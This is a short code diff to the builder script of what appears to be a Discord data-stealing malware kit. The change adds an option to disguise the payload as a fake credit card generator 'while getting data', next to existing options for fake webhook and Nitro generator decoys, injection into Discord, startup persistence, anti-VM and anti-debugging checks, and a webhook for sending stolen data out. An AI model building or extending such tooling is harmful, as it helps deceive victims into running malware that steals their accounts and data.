@@ -137,6 +137,7 @@ while True:
 
     FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
     FakeGen = get_boolean_input('enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
+    FakeCCGen = get_boolean_input('enable Fake Credit Card Generator Module (When the file is launched it will show a credit card generator while getting data) Y/N: ')
     Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
     Startup = get_boolean_input('Add the file to the startup folder? Y/N: ')
     No_Debug = get_boolean_input('Enable VM Checker and Anti Debugging Y/N: ')
@@ -197,6 +198,7 @@ while True:
     new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
+    new_content = new_content.replace("'%FakeCCGen%'", str(FakeCCGen))
     new_content = new_content.replace("'%Injection%'", str(Injection))
     new_content = new_content.replace("'%Startup%'", str(Startup))
     new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
